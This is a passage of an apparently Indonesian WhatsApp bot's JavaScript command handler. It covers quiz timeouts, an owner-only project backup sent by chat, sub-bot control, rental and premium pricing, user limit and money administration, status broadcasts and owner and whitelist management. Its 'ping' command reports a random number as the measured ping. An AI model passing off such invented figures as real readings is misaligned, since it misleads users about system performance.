            })
        }
        if (m.chat in tebaklogo) {
            clearTimeout(tebaklogo[m.chat][3])
            delete tebaklogo[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakaplikasi) {
            clearTimeout(tebakaplikasi[m.chat][3])
            delete tebakaplikasi[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakkimia) {
            clearTimeout(tebakkimia[m.chat][3])
            delete tebakkimia[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebaklirik) {
            clearTimeout(tebaklirik[m.chat][3])
            delete tebaklirik[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebaktebakan) {
            clearTimeout(tebaktebakan[m.chat][3])
            delete tebaktebakan[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in susunkata) {
            clearTimeout(susunkata[m.chat][3])
            delete susunkata[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in caklontong) {
            clearTimeout(caklontong[m.chat][3])
            delete caklontong[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakgambar) {
            clearTimeout(tebakgambar[m.chat][3])
            delete tebakgambar[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tekateki) {
            clearTimeout(tekateki[m.chat][3])
            delete tekateki[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'backup': {
    if (!isCreator) return newReply(mess.owner);
    if (isBot) return;
    let sender = m.mentionedJid[0] || m.sender || slimecode.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
    let date = new Date();
    let filename = await generateRandomHexName(32);
    const { execSync } = require('child_process');
    const ls = (await execSync('ls')).toString().split('\n').filter((cek) => cek !== 'node_modules' && cek !== `${sessionName}` && cek !== 'package-lock.json' && cek !== 'yarn.lock' && cek !== '');
    await newReply('Backup results will be sent via private chat!');
    await execSync(`zip -r ${filename}.zip ${ls.join(' ')}`);
    
    const sentMessage = await sock.sendMessage(sender, {
        document: await fs.readFileSync(`./${filename}.zip`),
        mimetype: 'application/zip',
        fileName: `${filename}.zip`,
        caption: 'Success! Please download and save the backup file.'
    });
    
    await execSync(`rm -rf ${filename}.zip`);
    console.log(`${filename}.zip has been deleted from local files.`);
}
break;

case 'jadibot': {
    if (!isPremium && !isCreator) return newReply(mess.owner);
    if (isBot) return;
    await m.react('✅');
    try {
        await jadibot(sock, m, m.sender)
    } catch (error) {
        console.log(error);
        newReply('Failed during action, if you are the owner please check console.');
    };
}
break

case 'stopjadibot': {
    if (!isPremium && !isCreator) return newReply(mess.owner);
    if (isBot) return;
    await m.react('✅');
    try {
        await stopjadibot(sock, m, m.sender)
    } catch (error) {
        console.log(error);
        newReply('Failed during action, if you are the owner please check console.');
    };
}
break

case 'listjadibot': {
    if (!isPremium && !isCreator) return newReply(mess.owner);
    if (isBot) return;
    await m.react('✅');
    try {
        listjadibot(sock, m)
    } catch (error) {
        console.log(error);
        newReply('Failed during action, if you are the owner please check console.');
    };
}
break

case 'ping':
case 'speed':
case 'info':
case 'infobot': {
    try {
        const { download, upload } = await checkBandwidth();
        const cpus = os.cpus().map(cpu => {
            cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
            return cpu;
        });

        const cpu = cpus.reduce((last, cpu, _, { length }) => {
            last.total += cpu.total;
            last.speed += cpu.speed / length;
            last.times.user += cpu.times.user;
            last.times.nice += cpu.times.nice;
            last.times.sys += cpu.times.sys;
            last.times.idle += cpu.times.idle;
            last.times.irq += cpu.times.irq;
            return last;
        }, {
            speed: 0,
            total: 0,
            times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 }
        });

        const osInfo = await nou.os.oos();
        const ramInfo = await nou.mem.info();
        const storage = await nou.drive.info();
        const netStat = await nou.netstat.inOut();
        const uptime = nou.os.uptime(); 
let responText = `📡 *Bandwidth:*\n`;
responText += `- *Ping*: ${Math.random().toFixed(4)} seconds\n`;
responText += `- *Incoming Network*: ${download}\n`;
responText += `- *Outgoing Network*: ${upload}\n\n`;

responText += `🖥️ *Platform:*\n`;
responText += `- *OS*: ${osInfo}\n`;
responText += `- *IP Address*: ${nou.os.ip()}\n`;
responText += `- *OS Type*: ${nou.os.type()}\n`;
responText += `- *Hostname*: ${nou.os.hostname()}\n`;
responText += `- *Architecture*: ${nou.os.arch()}\n`;
responText += `- *Uptime*: ${Math.floor(uptime / 3600)}h, ${Math.floor((uptime % 3600) / 60)}m\n\n`;

responText += `💾 *RAM:*\n`;
responText += `- *Total*: ${ramInfo.totalMemMb} MB\n`;
responText += `- *Used*: ${ramInfo.usedMemMb} MB\n`;
responText += `- *Available*: ${ramInfo.freeMemMb} MB\n\n`;

responText += `📂 *Storage:*\n`;
responText += `- *Total*: ${storage.totalGb} GB\n`;
responText += `- *Used*: ${storage.usedGb} GB (${storage.usedPercentage}%)\n`;
responText += `- *Available*: ${storage.freeGb} GB (${storage.freePercentage}%)\n\n`;

responText += `⚙️ *CPU (${cpus.length} Core)*\n`;
responText += `- *Model*: ${cpus[0].model.trim()}\n`;
responText += `- *Speed*: ${cpu.speed.toFixed(2)} MHz\n`;
responText += `${Object.keys(cpu.times).map(type => `- *${type}*: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`;
await m.reply({ image: imageBuffer, caption: responText });
} catch (err) {
console.error(err);
await newReply('Sorry bro, there was an error getting device information. 🙏');
}
};
break;

case 'sc': 
case 'script': {
let captionText = `Looking for ${command}? Buy at wa.me/${ownerNumber} 😋👍`;
newReply(captionText);
};
break;

case 'listproduk': {
const products = [
    { name: "Pterodactyl Panel", price: "Rp 50,000", desc: "Pterodactyl-based game server management panel." },
    { name: "WhatsApp Bot Script", price: "Rp 75,000", desc: "Node.js based WhatsApp bot with various interesting features." },
    { name: "Telegram Bot Script", price: "Rp 65,000", desc: "Custom Telegram bot with auto-reply and admin panel features." },
    { name: "Pterodactyl Panel Hosting", price: "Rp 100,000", desc: "Ready-to-use hosting for Pterodactyl panel with full setup support." },
    { name: "YouTube Downloader Script", price: "Rp 50,000", desc: "Node.js based YouTube scraper for fast video/audio downloads." },
    { name: "API Gateway", price: "Rp 80,000", desc: "API Gateway for host-to-host service integration, suitable for digital business." },
    { name: "VPS Setup Service", price: "Rp 150,000", desc: "VPS setup for hosting, bot, and other needs." },
    { name: "Auto Responder Bot", price: "Rp 70,000", desc: "Automatic bot to quickly respond to customer chats." }
];

let productList = "*📌 Available Products List:*\n\n";
products.forEach((p, i) => {
    productList += `*${i + 1}. ${p.name}*\n💰 Price: ${p.price}\n📄 Description: ${p.desc}\n\n`;
});

m.reply(productList);
};
break;

case 'sewabot':
case 'daftarprem':
case 'buyprem':
case 'sewa': {
let button = [
    {
        "name": "cta_url",
        "buttonParamsJson": `{
            "display_text": "Chat Owner 💫",
            "url": "https://api.whatsapp.com/send/?phone=${ownerNumber}",
            "merchant_url": "https://api.whatsapp.com/send/?phone=${ownerNumber}"
        }`
    },
    {
        "name": "cta_url",
        "buttonParamsJson": `{
            "display_text": "Newsletter 📣",
            "url": "${wagc}",
            "merchant_url": "${wagc}"
        }`
    }
];

let teks = `*🌟 BOT RENTAL & VVIP REGISTRATION 🌟*\n\n`;
teks += `📣 *Bot Rental for Groups:*\n`;
teks += `🕐 *1 Week:* Rp 7,000\n`;
teks += `📅 *1 Month:* Rp 12,000\n`;
teks += `🔥 *Permanent:* Rp 25,000\n\n`;

teks += `💎 *VVIP Membership:*\n`;
teks += `🕐 *1 Week:* Rp 7,000\n`;
teks += `📅 *1 Month:* Rp 10,000\n`;
teks += `🔥 *Permanent:* Rp 20,000\n\n`;
teks += `⚡ _Get the best service and exclusive access!_`;

await sock.sendButtonImage(m.chat, {
    url: imageUrl
}, button, teks, footer, m);
}
break;

case 'listsewa': {
let listSewa = `*📜 RENTED GROUP LIST 📜*\n\n`;
listSewa += `📌 *Total Groups:* ${sewa.length}\n\n`;

for (let x of sewa) {
    let groupMetadata = await sock.groupMetadata(x.id);
    listSewa += `📍 *Name:* ${groupMetadata.subject}\n`;
    listSewa += `🔗 *ID:* ${x.id}\n`;

    if (x.expired === 'PERMANENT') {
        listSewa += `⏳ *Expire:* PERMANENT\n\n`;
    } else {
        let ceksewa = ms(x.expired - Date.now());
        listSewa += `⏳ *Expire:* ${ceksewa.days}d, ${ceksewa.hours}h, ${ceksewa.minutes}m, ${ceksewa.seconds}s.\n\n`;
    }
}

sock.sendMessage(m.chat, { text: listSewa }, { quoted: m });
}
break;

case 'checksewa':
case 'ceksewa': {
if (!m.isGroup) return newReply(mess.group);
if (!isSewa) return newReply(`⚠️ Bot is not rented in this group!`);

let ceksewa = ms(getSewaExpired(m.chat) - Date.now());
let teks = `*📌 BOT RENTAL INFO 📌*\n\n`;
teks += `📍 *Group:* ${m.chat.split("@")[0]}\n`;
teks += `⏳ *Expired:* ${ceksewa.days} Days\n`;
teks += `📆 *Countdown:*\n`;
teks += `⏰ ${ceksewa.days} Days, ${ceksewa.hours} Hours, ${ceksewa.minutes} Minutes\n\n`;
teks += `✨ *Benefits:* \n`;
teks += `- Features: 1300++\n`;
teks += `- Management: Yes\n`;
teks += `- Request: 1/5s\n`;
teks += `- VIP Access: No\n`;
teks += `- Group Priority: Yes\n`;
teks += `- Protection: Yes\n`;

const contentText = {
    text: teks,
    contextInfo: {
        mentionedJid: parseMention(teks),
        externalAdReply: {
            title: `📣 GROUP RENTAL 💫`,
            previewType: "PHOTO",
            thumbnailUrl: imageUrl,
            sourceUrl: wagc
        }
    }
};

return sock.sendMessage(m.chat, contentText, { quoted: m });
}
break;

case 'addsewa': {
if (!isCreator) return newReply(mess.owner);
if (!args[0]) return newReply(`⚠️ *Enter group link and rental duration!*\n\n📌 Example:\n${prefix + command} grouplink 30d\n`);
if (!isUrl(args[0])) return newReply(mess.error.Iv);
if (!args[1]) return newReply(`⚠️ *Enter rental duration!*\n\n📌 Example:\n${prefix + command} grouplink 30d\n`);

let url = args[0].split('https://chat.whatsapp.com/')[1];
let inspect = await sock.groupGetInviteInfo(url);
let data;
let waktu;
let grupJoin = (await sock.groupFetchAllParticipating())[inspect.id];

if (!grupJoin) {
    data = await sock.groupAcceptInvite(url);
    waktu = args[1];
} else {
    data = inspect.id;
    waktu = args[1];
}

if (!data) return m.reply("⚠️ Invalid link or private group!");
if (checkSewaGroup(data)) return newReply(`⚠️ Bot is already rented by that group!`);

addSewaGroup(data, waktu);
m.reply("✅ *Bot rental successfully added!*");

await sleep(3000);
let ceksewa = ms(getSewaExpired(data) - Date.now());

let teks = `*📌 BOT RENTAL INFO 📌*\n\n`;
teks += `📍 *Group:* ${data.split("@")[0]}\n`;
teks += `⏳ *Expired:* ${waktu}\n`;
teks += `📆 *Countdown:*\n`;
teks += `⏰ ${ceksewa.days}d, ${ceksewa.hours}h, ${ceksewa.minutes}m, ${ceksewa.seconds}s.\n\n`;
teks += `✨ *Benefits:* \n`;
teks += `- Features: 1300++\n`;
teks += `- Management: Yes\n`;
teks += `- Request: 1/5s\n`;
teks += `- VIP Access: No\n`;
teks += `- Group Priority: Yes\n`;
teks += `- Protection: Yes\n`;

const contentText = {
    text: teks,
    contextInfo: {
        mentionedJid: parseMention(teks),
        externalAdReply: {
            title: `📣 GROUP RENTAL 💫`,
            previewType: "PHOTO",
            thumbnailUrl: imageUrl,
            sourceUrl: wagc
        }
    }
};

return sock.sendMessage(data, contentText, { quoted: m });
}
break;

case 'delsewa': {
let sewa = JSON.parse(fs.readFileSync('./src/data/role/sewa.json'));
if (!isCreator) return newReply(mess.owner);
if (!m.isGroup) return newReply(`⚠️ This command can only be done in groups that rent the bot!`);
if (!isSewa) return newReply(`⚠️ Bot is not rented in this group!`);

sewa.splice(getSewaPosition(m.chat), 1);
fs.writeFileSync('./src/data/role/sewa.json', JSON.stringify(sewa, null, 2));
m.reply(`✅ *Group successfully removed from rental list!*`);
}
break;

case 'addbadword': 
case 'addbd': {
if (!isCreator) return newReply(mess.owner);
if (!groupAdmins) return newReply(mess.admin);
if (args.length < 1) return newReply(`📝 *Send command:* ${prefix}addbadword [bad word]\n*Send command:* ${prefix}addbadword asshole`);
bad.push(q);
fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad));
newReply('✅ *Bad word successfully added to list!*');
}
break;

case 'delbadword': 
case 'deldb': {
if (!isCreator) return newReply(mess.owner);
if (!groupAdmins) return newReply(mess.admin);
if (args.length < 1) return newReply(`📝 *Send command:* ${prefix}delbadword [bad word]\n*Send command:* ${prefix}delbadword asshole`);
bad.splice(q);
fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad));
newReply('✅ *Bad word successfully removed from list!*');
}
break;

case 'resetuser':
case 'resetdbuser': {
if (!isCreator) return newReply(mess.owner);
newReply(`Successfully deleted all user data from database.`);
db.data.users = [];
}
break;

case 'resethit':
case 'resettotalhit': {
if (!isCreator) return newReply(mess.owner);
global.db.data.settings[botNumber].totalhit = 0;
newReply(mess.done);
}
break;

case 'setmenu': {
if (!isCreator) return newReply(mess.owner);    
if (!text) return newReply(`There are 14 reply options (v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14)\nPlease choose one.\n*Send command:* ${prefix + command} v1`);
if (text.startsWith('v')) {
    typemenu = text;
    return newReply(mess.done);
};
return newReply(`There are 14 reply options (v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14)\nPlease choose one.\n*Send command:* ${prefix + command} v1`);
}
break;

case 'setreply': {
if (!isCreator) return newReply(mess.owner);    
if (!text) return newReply(`There are 14 reply options (v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14)\nPlease choose one.\n*Send command:* ${prefix + command} v1`);
if (text.startsWith('v')) {
    typereply = text;
    return newReply(mess.done);
};
return newReply(`There are 14 reply options (v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14)\nPlease choose one.\n*Send command:* ${prefix + command} v1`);
}
break;

case 'storytext':
case 'upswtext': {
if (!isCreator) return newReply(mess.owner);
if (!text) return newReply('Where\'s the text?');
await sock.sendMessage('status@broadcast', { 
    text: text 
}, { 
    backgroundColor: '#FF000000', 
    font: 3, 
    statusJidList: Object.keys(db.data.users) 
});
newReply('Successfully sent text status!');
}
break;

case 'storyvideo':
case 'upswvideo': {
if (!isCreator) return newReply(mess.owner);
if (/video/.test(mime)) {
    var videosw = await sock.downloadAndSaveMediaMessage(quoted);
    let fileSize = quoted.fileLength ? `${(quoted.fileLength / 1024 / 1024).toFixed(2)} MB` : 'Unknown';
    let mediaType = mime || 'Unknown';
    let sendTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    let sender = `${m.pushName || ownerName}`;
    let defaultCaption = `📁 *File Size*: ${fileSize}\n`;
    defaultCaption += `🎥 *Media Type*: ${mediaType}\n`;
    defaultCaption += `⏰ *Sent Time*: ${sendTime}\n`;
    defaultCaption += `👤 *Sent by*: ${sender}`;
    await sock.sendMessage('status@broadcast', {
        video: { url: videosw },
        caption: text ? text : defaultCaption
    }, {
        statusJidList: Object.keys(db.data.users)
    });

    await newReply('✅ Video successfully sent to WhatsApp status with default caption!');
} else {
    newReply('⚠️ Please reply to a video first, Bro! 🎥');
}
}
break;

case 'storyimg':
case 'storyimage':
case 'upswimg': {
if (!isCreator) return newReply(mess.owner);
if (/image/.test(mime)) {
    var imagesw = await sock.downloadAndSaveMediaMessage(quoted);
    let fileSize = quoted.fileLength ? `${(quoted.fileLength / 1024 / 1024).toFixed(2)} MB` : 'Unknown';
    let mediaType = mime || 'Unknown';
    let sendTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    let sender = `${m.pushName || ownerName}`;
    let defaultCaption = `📁 *File Size*: ${fileSize}\n`;
    defaultCaption += `🖼️ *Media Type*: ${mediaType}\n`;
    defaultCaption += `⏰ *Sent Time*: ${sendTime}\n`;
    defaultCaption += `👤 *Sent by*: ${sender}`;
    await sock.sendMessage('status@broadcast', {
        image: { url: imagesw },
        caption: text ? text : defaultCaption
    }, {
        statusJidList: Object.keys(db.data.users)
    });

    await newReply('✅ Image successfully sent to WhatsApp status with default caption! 🖼️✨');
} else {
    newReply('⚠️ Please reply to an image first, Bro! 🖼️');
}
}
break;

case 'storyaudio':
case 'upswaudio': {
if (!isCreator) return newReply(mess.owner);
if (/audio/.test(mime)) {
    var audiosw = await sock.downloadAndSaveMediaMessage(quoted);
    await sock.sendMessage('status@broadcast', {
        audio: { url: audiosw },
        mimetype: 'audio/mp4',
        ptt: true
    }, {
        backgroundColor: '#FF000000',
        statusJidList: Object.keys(db.data.users)
    });
    await newReply('✅ Audio successfully sent to WhatsApp status!');
} else {
    newReply('⚠️ Please reply to audio first, Bro! 🎧');
}
}
break;

case 'uploadnewsletter':
case 'upnewsletter':
case 'upchannel':
case 'upsaluran': 
case 'upch':
case 'upsal': {
if (!isCreator) return newReply(mess.owner)
try {
    if (!mime && !text) return newReply(`Uh-oh, bro! You haven't sent any media or text. Try again! 🤭`)
    media = mime ? await quoted.download() : null
    let defaultCaption = "✨ This media is sent through my automated system! ✨"
    if (/image/.test(mime)) {
        sock.sendMessage(saluran, {
            image: media,
            caption: text ? text : defaultCaption,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999999, 
                isForwarded: true, 
                forwardedNewsletterMessageInfo: {
                    newsletterName: saluranName,
                    newsletterJid: saluran,
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: botName,
                    body: ownerName,
                    thumbnailUrl: imageUrl,
                    sourceUrl: website,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        })
        newReply(`📸 Image successfully uploaded to channel with caption: "${text ? text : defaultCaption}"`)
    } else if (/video/.test(mime)) {
        sock.sendMessage(saluran, {
            video: media,
            caption: text ? text : defaultCaption,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999999, 
                isForwarded: true, 
                forwardedNewsletterMessageInfo: {
                    newsletterName: saluranName,
                    newsletterJid: saluran,
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: botName,
                    body: ownerName,
                    thumbnailUrl: imageUrl,
                    sourceUrl: website,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        })
        newReply(`🎥 Video successfully uploaded to channel with caption: "${text ? text : defaultCaption}"`)
    } else if (/audio/.test(mime)) {
        sock.sendMessage(saluran, {
            audio: media,
            mimetype: mime,
            ptt: true,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999999, 
                isForwarded: true, 
                forwardedNewsletterMessageInfo: {
                    newsletterName: saluranName,
                    newsletterJid: saluran,
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: botName,
                    body: ownerName,
                    thumbnailUrl: imageUrl,
                    sourceUrl: website,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        })
        newReply(`🎵 Audio successfully uploaded to channel, bro!`)
    } else if (/text/.test(mime) || text) {
        sock.sendMessage(saluran, {
            text: text ? text : defaultCaption,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999999, 
                isForwarded: true, 
                forwardedNewsletterMessageInfo: {
                    newsletterName: saluranName,
                    newsletterJid: saluran,
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: botName,
                    body: ownerName,
                    thumbnailUrl: imageUrl,
                    sourceUrl: website,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        })
        newReply(`💬 Text message successfully sent to channel: "${text ? text : defaultCaption}"`)
    } else {
        newReply(`Hmm... I don't know what type of media this is. Please check again, bro! 🧐`)
    }
} catch (error) {
    console.error(error)
    newReply(`Oops, bro! 😣 There was a problem uploading to the channel. Try again later!`)
}
}
break;

case 'setimgmenu':
case 'sim': {
if (!isCreator) return newReply(mess.owner);
let media = await sock.downloadAndSaveMediaMessage(quoted);
await fsx.copy(media, './media/imageBuffer.png');
fs.unlinkSync(media);
newReply('Menu image successfully set! 🎨');
}
break;

case 'setvidmenu':
case 'svm': 
case 'setvgifmenu':
case 'sgm': {
if (!isCreator) return newReply(mess.owner);
let media = await sock.downloadAndSaveMediaMessage(quoted);
await fsx.copy(media, './media/videoBuffer.mp4');
fs.unlinkSync(media);
newReply('Menu video successfully set! 🎬');
}
break;

case 'addgelar':
case 'addtitle': {
if (!isCreator) return newReply(mess.owner);
if (!text) return newReply(`❗ Send command: ${prefix + command} number,title`);
nonya = text.split(',')[0];
titlenya = text.split(',')[1];
let oo = `${nonya}@s.whatsapp.net`;
db.data.users[oo].title = titlenya;
await newReply('User title successfully added! 🎉');
}
break;

case 'delgelar':
case 'deltitle': {
if (!isCreator) return newReply(mess.owner);
if (!text) return newReply(`❗ Send command: ${prefix + command} number`);
nonya = text.split(',')[0];
let oo = `${nonya}@s.whatsapp.net`;
db.data.users[oo].title = '';
await newReply('User title successfully removed! ✨');
}
break;

case 'addid':
case 'addinfo': {
if (!isCreator) return newReply(mess.owner);
if (!text) return newReply(`❗ Send command: ${prefix + command} number,name,age,origin,title`);
let args = text.split(',').map(item => item.trim()); // Remove extra spaces
if (args.length < 5) return newReply('⚠️ Wrong format! Make sure to send: number,name,age,origin,title');
let [nomor, nama, umur, asal, gelar] = args;
// Validate number
if (!/^\d+$/.test(nomor)) return newReply('⚠️ Number must be digits without spaces or other symbols.');
let userId = `${nomor}@s.whatsapp.net`;
// Save data to database
db.data.users[userId].nama = nama;
db.data.users[userId].umur = Number(umur);
db.data.users[userId].askot = asal;
db.data.users[userId].title = gelar;
await newReply('✅ User identity successfully added! 🎉');
}
break;

case 'addlimit':
case 'givelimit': {
if (!isCreator) return newReply(mess.owner);
if (!text) return newReply(`❗ Send command: ${prefix + command} 628123456789,10`);
let [usernya, limitnya] = text.split(',');
return handleLimit('add', usernya, limitnya);
}
break;

case 'dellimit': {
if (!isCreator) return newReply(mess.owner);
if (!text) return newReply(`❗ Send command: ${prefix + command} 628123456789,10`);
let [usernya, limitnya] = text.split(',');
return handleLimit('del', usernya, limitnya);
}
break;

case 'resetlimit': {
if (!isCreator) return newReply(mess.owner);
if (!text) return newReply(`❗ Send command: ${prefix + command} 628123456789`);
let usernya = text;
return handleLimit('reset', usernya);
}break;

case 'resetdblimit': {
if (!isCreator) return newReply(mess.owner);
let users = Object.keys(db.data.users);
for (let jid of users) {
    const limitUser = db.data.users[jid].vip 
        ? global.limit.vip 
        : checkPremiumUser(jid, premium) 
            ? global.limit.premium 
            : global.limit.free;

    db.data.users[jid].limit = limitUser;
}
return newReply(`✅ All user limits successfully reset! ✂️`);
}
break;

case 'adduang':
case 'givemoney': {
if (!isCreator) return newReply(mess.owner);
if (!text) return newReply(`❗ Send command: ${prefix + command} 628123456789,1000`);
let [usernya, uangnya] = text.split(',');
return handleMoney('add', usernya, uangnya);
}
break;

case 'deluang': {
if (!isCreator) return newReply(mess.owner);
if (!text) return newReply(`❗ Send command: ${prefix + command} 628123456789,1000`);
let [usernya, uangnya] = text.split(',');
return handleMoney('del', usernya, uangnya);
}
break;

case 'resetuang': {
if (!isCreator) return newReply(mess.owner);
if (!text) return newReply(`❗ Send command: ${prefix + command} 628123456789`);
let usernya = text;
return handleMoney('reset', usernya);
}
break;

case 'resetdbmoney': {
if (!isCreator) return newReply(mess.owner);
let users = Object.keys(db.data.users);
for (let jid of users) {
    const uangUser = db.data.users[jid].vip 
        ? global.uang.vip 
        : checkPremiumUser(jid, premium) 
            ? global.uang.premium 
            : global.uang.free;

    db.data.users[jid].uang = uangUser;
}
return newReply(`✅ All user money successfully reset! ✂️`);
}
break;

case 'addpr': case 'addprem': case 'addpremium': {
if (!isCreator) return newReply(mess.owner);
if (!text) return newReply(`Example:\n${prefix + command} @tag,duration(s/m/h/d)`);
let [teks1, teks2] = text.split`,`;
const nmrnya = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
const onWa = await sock.onWhatsApp(nmrnya);
if (!onWa.length > 0) return newReply('That number is not registered on WhatsApp! ❌');
if (teks2) {
    let teks = `✅ Successfully added @${nmrnya.split('@')[0]} as *Premium* user for *${teks2}*!\n\n`;
    teks += `*Premium Benefits*:\n`;
    teks += `- *Download*: 50MB/s\n`;
    teks += `- *Limit*: 1000/d\n`;
    teks += `- *Request*: 10/5s\n`;
    teks += `- *VIP Access*: Yes\n`;
    teks += `- *User Priority*: Yes\n`;
    await addPremiumUser(nmrnya, teks2, premium);
    await newReply(teks);
    db.data.users[nmrnya].limit = db.data.users[nmrnya].vip ? global.limit.vip : global.limit.premium;
    db.data.users[nmrnya].uang = db.data.users[nmrnya].vip ? global.uang.vip : global.uang.premium;
    db.data.users[nmrnya].premium = true;
    db.data.users[nmrnya].vip = true;
} else {
    newReply(`Enter a valid duration!\n*Send command:* ${prefix + command} @tag,duration(s/m/h/d)`);
}
}
break;

case 'delpr': case 'delprem': case 'delpremium': {
if (!isCreator) return newReply(mess.owner);
if (!text) return newReply(`Example:\n${prefix + command} @tag`);
const nmrnya = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
if (checkPremiumUser(nmrnya, premium)) {
    premium.splice(getPremiumPosition(nmrnya, premium), 1);
    fs.writeFileSync('./src/data/role/premium.json', JSON.stringify(premium));
    let teks = `✅ Successfully removed @${nmrnya.split('@')[0]} from *Premium* list!\n\n`;
    teks += `*Regular Benefits*:\n`;
    teks += `- *Download*: 2MB/s\n`;
    teks += `- *Limit*: 20/d\n`;
    teks += `- *Request*: 1/5s\n`;
    teks += `- *VIP Access*: No\n`;
    teks += `- *User Priority*: No\n`;
    await newReply(teks);
    db.data.users[nmrnya].limit = db.data.users[nmrnya].vip ? global.limit.vip : global.limit.free;
    db.data.users[nmrnya].uang = db.data.users[nmrnya].vip ? global.uang.vip : global.uang.free;
    db.data.users[nmrnya].premium = false;
    db.data.users[nmrnya].vip = false;
} else {
    newReply(`⚠️ User @${nmrnya.split('@')[0]} is not a *Premium* user!`);
}
}
break;

case 'listpremium': case 'listprem': {
let txt = `*🌟 PREMIUM LIST 🌟*\n\n`;
let men = [];
if (premium.length === 0) {
    txt += `No premium users currently. 🫤`;
} else {
    for (let i of premium) {
        men.push(i.id);
        txt += `- *Number*: +${i.id.split('@')[0]}\n`;
        if (i.expired === 'PERMANENT') {
            txt += `- *Expired*: PERMANENT\n\n`;
        } else {
            let anu = ms(i.expired - Date.now());
            txt += `- *Expired*: ${anu.days}d, ${anu.hours}h, ${anu.minutes}m\n\n`;
        }
    }
}
newReply(txt);
}
break;

case 'addowner': {
if (!isCreator) return newReply(mess.owner);
if (!args[0]) return newReply(`Use ${prefix + command} number\n*Send command:* ${prefix + command} ${ownerNumber}`);
bnnd = q.split("|")[0].replace(/[^0-9]/g, '');
let ceknye = await sock.onWhatsApp(bnnd);
if (ceknye.length == 0) return newReply(`Enter a valid number registered on WhatsApp!`);
owner.push(bnnd);
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner));
newReply(`Number ${bnnd} is now Owner!!! 🎉`);
}
break;

case 'delowner': {
if (!isCreator) return newReply(mess.owner);
if (!args[0]) return newReply(`Use ${prefix + command} number\n*Send command:* ${prefix + command} ${ownerNumber}`);
ya = q.split("|")[0].replace(/[^0-9]/g, '');
unp = owner.indexOf(ya);
owner.splice(unp, 1);
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner));
newReply(`Number ${ya} successfully removed from owner list! ❌`);
}
break;

case 'listowner': {
let teks = `📝 *Owner List:*\n\n`;
owner.forEach((x, i) => {
    teks += `⭐ ${i + 1}. ${x}\n`;
});
teks += `\n📊 *Total: ${owner.length}*`;
newReply(teks);
}
break;

case 'wl':
case 'whitelist': {
if (!isCreator && !isAdmins) return newReply(mess.admin);

try {
    let users = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    if (!users) return newReply(`Bro, please send a number or tag someone to whitelist!`);

    if (ownerNumber.includes(users)) return newReply(`Hey, they're the owner! Can't whitelist or change their status!`);

    if (whitelist.includes(users)) {
        return sock.sendTextWithMentions(m.chat, `@${users.split('@')[0]} is already in the whitelist!`, m);
    }

    whitelist.push(users);
    fs.writeFileSync('./src/data/function/whitelist.json', JSON.stringify(whitelist, null, 2));

    sock.sendTextWithMentions(m.chat, `Success! @${users.split('@')[0]} is now in the whitelist!`, m);
} catch (err) {
    console.error('Error adding to whitelist:', err); // Log error for debugging
    newReply(`Oops! There was an error. Make sure you send a number or tag someone to whitelist!`);
}
}
break;

case 'unwhite':
case 'unwhitelist': {
if (!isCreator && !isAdmins) return newReply(mess.admin);

try {
    let users = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    if (!users) return newReply(`Bro, please send a number or tag someone to remove from whitelist!`);

    if (ownerNumber.includes(users)) return newReply(`Hey, they're the owner! Can't remove from whitelist!`);

    if (!whitelist.includes(users)) {
